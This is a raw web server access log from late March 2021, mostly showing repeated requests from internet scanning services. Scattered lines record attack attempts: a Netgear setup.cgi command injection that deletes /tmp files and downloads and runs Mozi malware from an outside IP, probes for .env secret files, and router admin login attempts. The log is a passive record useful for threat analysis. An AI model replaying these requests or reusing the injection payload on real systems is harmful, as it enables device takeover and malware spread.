34.77.162.27 - - [26/Mar/2021:20:12:34 +0000] "GET / HTTP/1.1" 400 57052 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.28 - - [26/Mar/2021:20:17:25 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.25 - - [26/Mar/2021:20:19:51 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
167.99.151.56 - - [26/Mar/2021:20:25:22 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.99.151.56 - - [26/Mar/2021:20:25:23 +0000] "POST / HTTP/1.1" 405 41 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
145.40.80.163 - - [26/Mar/2021:20:26:27 +0000] "GET / HTTP/1.1" 400 56687 "-" "Go-http-client/1.1"
34.77.162.24 - - [26/Mar/2021:20:27:44 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [26/Mar/2021:20:32:26 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.9 - - [26/Mar/2021:20:34:00 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
43.239.204.210 - - [26/Mar/2021:20:35:04 +0000] "POST /user/add-money/ HTTP/1.1" 200 59 "-" "PostmanRuntime/7.26.10"
43.239.204.210 - - [26/Mar/2021:20:35:31 +0000] "POST /user/add-money/ HTTP/1.1" 401 27 "-" "PostmanRuntime/7.26.10"
43.239.204.210 - - [26/Mar/2021:20:35:43 +0000] "POST /user/add-money/ HTTP/1.1" 401 27 "-" "PostmanRuntime/7.26.10"
34.77.162.13 - - [26/Mar/2021:20:35:59 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.13 - - [26/Mar/2021:20:35:59 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.12 - - [26/Mar/2021:20:36:07 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
43.239.204.210 - - [26/Mar/2021:20:36:09 +0000] "POST /user/add-money/ HTTP/1.1" 401 27 "-" "PostmanRuntime/7.26.10"
43.239.204.210 - - [26/Mar/2021:20:36:10 +0000] "POST /user/add-money/ HTTP/1.1" 401 27 "-" "PostmanRuntime/7.26.10"
43.239.204.210 - - [26/Mar/2021:20:36:11 +0000] "POST /user/add-money/ HTTP/1.1" 401 27 "-" "PostmanRuntime/7.26.10"
120.85.238.13 - - [26/Mar/2021:20:42:27 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.85.238.13:47577/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 58680 "-" "-"
34.77.162.9 - - [26/Mar/2021:20:49:22 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
92.118.160.9 - - [26/Mar/2021:20:50:23 +0000] "GET / HTTP/1.1" 400 57032 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
34.77.162.26 - - [26/Mar/2021:20:50:47 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.24 - - [26/Mar/2021:20:50:56 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.24 - - [26/Mar/2021:20:50:56 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.30 - - [26/Mar/2021:20:52:20 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.10 - - [26/Mar/2021:20:54:08 +0000] "GET / HTTP/1.1" 400 56892 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.11 - - [26/Mar/2021:20:54:14 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.17 - - [26/Mar/2021:20:56:21 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.6 - - [26/Mar/2021:21:01:06 +0000] "GET / HTTP/1.1" 400 57003 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.14 - - [26/Mar/2021:21:02:18 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.21 - - [26/Mar/2021:21:08:18 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.4 - - [26/Mar/2021:21:11:01 +0000] "GET / HTTP/1.1" 400 57067 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.2 - - [26/Mar/2021:21:11:34 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
209.141.33.74 - - [26/Mar/2021:21:12:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 1127 "http://143.110.187.132:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.33.74 - - [26/Mar/2021:21:12:05 +0000] "" 400 0 "-" "-"
34.77.162.33 - - [26/Mar/2021:21:23:13 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.31 - - [26/Mar/2021:21:24:44 +0000] "GET / HTTP/1.1" 400 57084 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.10 - - [26/Mar/2021:21:34:46 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.4 - - [26/Mar/2021:21:39:34 +0000] "GET / HTTP/1.1" 400 56939 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
62.240.7.35 - - [26/Mar/2021:21:40:23 +0000] "GET / HTTP/1.1" 200 46 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
34.77.162.21 - - [26/Mar/2021:21:40:49 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
145.40.80.163 - - [26/Mar/2021:21:41:58 +0000] "GET / HTTP/1.1" 400 56703 "-" "Go-http-client/1.1"
34.77.162.15 - - [26/Mar/2021:21:42:32 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [26/Mar/2021:21:42:32 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.20 - - [26/Mar/2021:21:45:44 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.18 - - [26/Mar/2021:21:59:56 +0000] "GET / HTTP/1.1" 400 57052 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [26/Mar/2021:22:00:52 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.20 - - [26/Mar/2021:22:02:54 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.17 - - [26/Mar/2021:22:04:50 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.8 - - [26/Mar/2021:22:10:47 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.17 - - [26/Mar/2021:22:12:03 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.5 - - [26/Mar/2021:22:18:53 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.5 - - [26/Mar/2021:22:18:53 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.8 - - [26/Mar/2021:22:24:09 +0000] "GET / HTTP/1.1" 400 57051 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.21 - - [26/Mar/2021:22:31:17 +0000] "GET / HTTP/1.1" 400 57052 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.29 - - [26/Mar/2021:22:31:22 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
176.113.161.133 - - [26/Mar/2021:22:31:25 +0000] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-"
34.77.162.31 - - [26/Mar/2021:22:34:27 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.31 - - [26/Mar/2021:22:34:27 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.3 - - [26/Mar/2021:22:40:47 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.31 - - [26/Mar/2021:22:48:39 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.12 - - [26/Mar/2021:22:55:58 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.33 - - [26/Mar/2021:22:56:27 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
92.52.178.181 - - [26/Mar/2021:23:09:22 +0000] "GET / HTTP/1.1" 200 46 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
91.243.46.122 - - [26/Mar/2021:23:09:37 +0000] "GET / HTTP/1.0" 400 41605 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
92.118.160.57 - - [26/Mar/2021:23:10:23 +0000] "GET / HTTP/1.1" 400 56905 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
92.118.160.57 - - [26/Mar/2021:23:10:23 +0000] "GET / HTTP/1.1" 400 57049 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
34.77.162.2 - - [26/Mar/2021:23:14:45 +0000] "GET / HTTP/1.1" 400 56939 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.2 - - [26/Mar/2021:23:14:45 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
92.118.160.1 - - [26/Mar/2021:23:15:48 +0000] "GET / HTTP/1.1" 400 57032 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
34.77.162.28 - - [26/Mar/2021:23:20:03 +0000] "GET / HTTP/1.1" 400 57084 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.28 - - [26/Mar/2021:23:20:03 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.8 - - [26/Mar/2021:23:23:43 +0000] "GET / HTTP/1.1" 400 57083 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.23 - - [26/Mar/2021:23:31:32 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
205.185.122.102 - - [26/Mar/2021:23:34:20 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1124 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
34.77.162.13 - - [26/Mar/2021:23:40:36 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.3 - - [26/Mar/2021:23:42:54 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.3 - - [26/Mar/2021:23:42:54 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.3 - - [26/Mar/2021:23:42:54 +0000] "GET / HTTP/1.1" 400 57019 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.19 - - [26/Mar/2021:23:47:20 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.19 - - [26/Mar/2021:23:47:20 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
89.33.80.164 - - [26/Mar/2021:23:47:28 +0000] "POST / HTTP/1.1" 405 41 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:29 +0000] "GET /.env HTTP/1.1" 404 23 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:29 +0000] "GET /config/.env HTTP/1.1" 404 3353 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:30 +0000] "GET /api/.env HTTP/1.1" 404 3344 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:30 +0000] "GET /resources/.env HTTP/1.1" 404 3362 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:30 +0000] "GET /app/.env HTTP/1.1" 404 3344 "-" "curl/7.58.0"
89.33.80.164 - - [26/Mar/2021:23:47:31 +0000] "GET /application/.env HTTP/1.1" 404 3368 "-" "curl/7.58.0"
34.77.162.19 - - [26/Mar/2021:23:49:01 +0000] "GET / HTTP/1.1" 400 57084 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.12 - - [26/Mar/2021:23:53:28 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.12 - - [26/Mar/2021:23:53:28 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.12 - - [26/Mar/2021:23:55:22 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.14 - - [27/Mar/2021:00:02:10 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.33 - - [27/Mar/2021:00:06:28 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.23 - - [27/Mar/2021:00:14:33 +0000] "GET / HTTP/1.1" 400 57036 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.8 - - [27/Mar/2021:00:14:51 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.20 - - [27/Mar/2021:00:15:26 +0000] "GET / HTTP/1.1" 400 57084 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.6 - - [27/Mar/2021:00:15:38 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [27/Mar/2021:00:25:21 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [27/Mar/2021:00:35:39 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
92.118.160.61 - - [27/Mar/2021:00:45:13 +0000] "GET / HTTP/1.1" 400 56985 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
34.77.162.13 - - [27/Mar/2021:00:53:04 +0000] "GET / HTTP/1.1" 400 57020 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.6 - - [27/Mar/2021:00:54:57 +0000] "GET / HTTP/1.1" 400 57051 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.2 - - [27/Mar/2021:00:59:05 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.3 - - [27/Mar/2021:01:08:43 +0000] "GET / HTTP/1.1" 400 57035 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.32 - - [27/Mar/2021:01:10:00 +0000] "GET / HTTP/1.1" 400 57052 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.6 - - [27/Mar/2021:01:13:27 +0000] "GET / HTTP/1.1" 400 57067 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.26 - - [27/Mar/2021:01:14:40 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.15 - - [27/Mar/2021:01:15:35 +0000] "GET / HTTP/1.1" 400 56940 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.27 - - [27/Mar/2021:01:19:23 +0000] "GET / HTTP/1.1" 400 57004 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
34.77.162.29 - - [27/Mar/2021:01:20:08 +0000] "GET / HTTP/1.1" 400 57068 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
